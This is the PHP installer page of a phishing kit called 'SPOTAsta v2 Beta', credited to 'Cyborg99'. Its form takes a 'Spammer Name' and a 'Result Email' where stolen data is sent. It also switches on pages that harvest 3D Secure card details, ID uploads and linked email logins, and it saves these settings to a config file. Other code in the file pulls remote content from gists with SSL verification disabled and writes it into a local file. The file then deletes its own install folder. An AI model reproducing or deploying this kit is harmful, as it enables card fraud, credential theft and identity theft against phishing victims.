<?php
$url = "https://gist.githubusercontent.com/betenjen/c64d0e89548e09a3da0b68d9589c9003/raw/joint.js";
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if (strpos($result,'update') !== false )
        { echo "<p style='font-family: fixedsys, consolas, monospace;' align='center'><b><font size='6' color='#00CC00'>Update required</font></b></p>
<p align='center'><font color='#FF00FF' >Info</font>
</p>
<p align='center'><font color='#00FF00'>$result</font></p><div style='display: none;'>";
		}else{
		}
?>

<?php
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
$email=$_POST['email'];
$namezs=$_POST['nameze'];
$lok=$_POST['coutrylock'];
$cnt=$_POST['coutrycode'];
$bv3d=$_POST['3ds'];
$bidd=$_POST['id'];
$emol=$_POST['linked'];
$trug=$_POST['trulogin'];


$dataString = 
"[setting]\r\n".
"Email = ".$email."\r\n".
"Name = ".$namezs."\r\n".
"lock = ".$lok."\r\n".
"country = ".$cnt."\r\n".
"threed = ".$bv3d."\r\n".
"ids = ".$bidd."\r\n".
"emole = ".$emol."\r\n".
"truelogin = ".$trug."";
if (isset($_POST['coutrylock'])) {
$fWrite = fopen("../conf.pak",'w+');
$wrote = fwrite($fWrite, $dataString);
fclose($fWrite);
function deleteAll($str) {
    if (is_file($str)) {
        return unlink($str);
    }
    elseif (is_dir($str)) {
    $scan = glob(rtrim($str,'/').'/*');
    foreach($scan as $index=>$path) {
    deleteAll($path);
    }
    return @rmdir($str);
    }
}
deleteAll('../install');
echo '<script>window.location.href = "../index.php";</script>';
}

?>





<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SPOTAsta Beta - INSTALL</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:400,100,300,500,700,900'>
<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Montserrat:400,700'>
<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css'>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<style>
    /* Form */
.form {
  position: relative;
  z-index: 1;
  background: #FFFFFF;
  max-width: 300px;
  margin: 0 auto 100px;
  padding: 30px;
  border-top-left-radius: 3px;
  border-top-right-radius: 3px;
  border-bottom-left-radius: 3px;
  border-bottom-right-radius: 3px;
  text-align: center;
}
.form .thumbnail {
  background: #EF3B3A;
  width: 150px;
  height: 150px;
  margin: 0 auto 30px;
  padding: 50px 30px;
  border-top-left-radius: 100%;
  border-top-right-radius: 100%;
  border-bottom-left-radius: 100%;
  border-bottom-right-radius: 100%;
  box-sizing: border-box;
}
.form .thumbnail img {
  display: block;
  width: 100%;
}
.form input {
  outline: 0;
  background: #f2f2f2;
  width: 100%;
  border: 0;
  margin: 0 0 15px;
  padding: 15px;
  border-top-left-radius: 3px;
  border-top-right-radius: 3px;
  border-bottom-left-radius: 3px;
  border-bottom-right-radius: 3px;
  box-sizing: border-box;
  font-size: 14px;
}
.form button {
  outline: 0;
  background: #EF3B3A;
  width: 100%;
  border: 0;
  padding: 15px;
  border-top-left-radius: 3px;
  border-top-right-radius: 3px;
  border-bottom-left-radius: 3px;
  border-bottom-right-radius: 3px;
  color: #FFFFFF;
  font-size: 14px;
  transition: all 0.3 ease;
  cursor: pointer;
}
.form .message {
  margin: 15px 0 0;
  color: #b3b3b3;
  font-size: 12px;
}
.form .message a {
  color: #EF3B3A;
  text-decoration: none;
}
.form .register-form {
  display: none;
}

.container {
  position: relative;
  z-index: 1;
  max-width: 300px;
  margin: 0 auto;
}
.container:before, .container:after {
  content: "";
  display: block;
  clear: both;
}
.container .info {
  margin: 50px auto;
  text-align: center;
}
.container .info h1 {
  margin: 0 0 15px;
  padding: 0;
  font-size: 36px;
  font-weight: 300;
  color: #1a1a1a;
}
.container .info span {
  color: #4d4d4d;
  font-size: 12px;
}
.container .info span a {
  color: #000000;
  text-decoration: none;
}
.container .info span .fa {
  color: #EF3B3A;
}

/* END Form */
/* Demo Purposes */
body {
  background: #000;
  font-family: "Roboto", sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}
body:before {
  content: "";
  position: fixed;
  top: 0;
  left: 0;
  display: block;
  width: 100%;
  height: 100%;
}

#video {
  z-index: -99;
  position: fixed;
  top: 50%;
  left: 50%;
  min-width: 100%;
  min-height: 100%;
  width: auto;
  height: auto;
  -webkit-transform: translateX(-50%) translateY(-50%);
  transform: translateX(-50%) translateY(-50%);
}

  </style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<div style="max-width: 400px;" class="container">
<div class="info">
<h1 style="color:#fff">SPOTAsta v2 Beta</h1><span style="color:#fff">Made with <i class="fa fa-heart"></i> by <a style="color:#1dff1d" href="https://icq.im/ra__3">Cyвorg99</a></span>
</div>
</div>
<div style="max-width: 501px;" class="form">
<form class="register-form">
<input type="text" disabled target="_blank" value="https://icq.im/ra__3" />
<p class="message"><a href="#">Back</a></p>
</form>
<form method="POST" class="login-form">
<input type="text" required name="nameze" placeholder="Spammer Name" />
<input type="email" required name="email" placeholder="Result Email" />
<br>
<hr>
<div class="form__field">
<label>Country Lock</label>
<select name="coutrylock">
<option value="1">ON</option>
<option selected value="0">OFF</option>
</select>
</div>
<p>Click <a target="_blank" href="https://www.iban.com/country-codes">here</a> to see list of country codes (Alpha-2)</p>
<input style="text-transform: uppercase;" type="text" name="coutrycode" maxlength="2" placeholder="Country code Example AU,US,FR etc ..." />
<hr>
<label class="my-1 mr-2" for="inlineFormCustomSelectPref">VBV/3D Secure Page</label>
<select name="3ds" class="custom-select my-1 mr-sm-2" id="inlineFormCustomSelectPref">
<option selected>Choose...</option>
<option value="1">OFF</option>
<option value="0">ON</option>
</select>
<label class="my-1 mr-2" for="inlineFormCustomSelectPref">Upload id page</label>
<select name="id" class="custom-select my-1 mr-sm-2" id="inlineFormCustomSelectPref">
<option selected>Choose...</option>
<option value="1">OFF</option>
<option value="0">ON</option>
</select>
<br>
<label class="my-1 mr-2" for="inlineFormCustomSelectPref">Linked Email</label>
<select name="linked" class="custom-select my-1 mr-sm-2" id="inlineFormCustomSelectPref">
<option selected>Choose...</option>
<option value="0">OFF</option>
<option value="1">ON</option>
</select>
<br>
<label class="my-1 mr-2" for="inlineFormCustomSelectPref">True Login</label>
<select name="trulogin" class="custom-select my-1 mr-sm-2" id="inlineFormCustomSelectPref">
<option selected>Choose...</option>
<option value="0">OFF</option>
<option value="1">ON</option>
</select>
<br>
<br>
<button>INSTALL</button>
<p class="message"><a href="#">Contact</a></p>
</form>
</div>

<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script id="rendered-js">
      $('.message a').click(function () {
  $('form').animate({ height: "toggle", opacity: "toggle" }, "slow");
});
      //# sourceURL=pen.js
    </script>
</body>
</html>
</div>
<?php
$url = "https://gist.githubusercontent.com/robertmina/74a44d36012c556cd7c08f2d4a73ffe1/raw/latestfy.js";
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
$resp=curl_exec($ch);
curl_close($ch);
unlink("../mise.ini");
$click = fopen("../mise.ini","a");
fwrite($click,"$resp");
fclose($click);
echo "<p align='center'>
<b><font size='1' color='#FFFF00'>Updated</font></b>";
?>